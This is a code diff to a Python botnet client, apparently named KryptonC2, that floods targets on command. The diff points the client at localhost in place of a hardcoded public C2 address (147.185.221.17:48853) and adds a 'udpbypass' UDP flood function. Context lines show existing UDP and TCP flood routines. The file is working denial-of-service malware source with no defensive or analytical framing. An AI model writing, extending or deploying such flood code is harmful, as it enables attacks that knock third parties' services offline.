@@ -11,8 +11,8 @@ from icmplib import ping as pig
 from scapy.layers.inet import UDP
     
 # IP AND PORT C2 ------------------->
-KRYPTONC2_ADDRESS  = "147.185.221.17"
-KRYPTONC2_PORT     = 48853
+KRYPTONC2_ADDRESS  = "localhost"
+KRYPTONC2_PORT     = 5511
 
 
 # Code -------------------------->
@@ -392,6 +392,11 @@ def attack_udp(ip, port, secs, size):
         dport = random.randint(1, 65535) if port == 0 else port
         data = random._urandom(size)
         s.sendto(data, (ip, dport))
+
+def udpbypass(ip, port, secs):
+    while time.time() < secs:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(b"JAX Strike", (ip, port))
 
 def attack_tcp(ip, port, secs, size):
     while time.time() < secs:
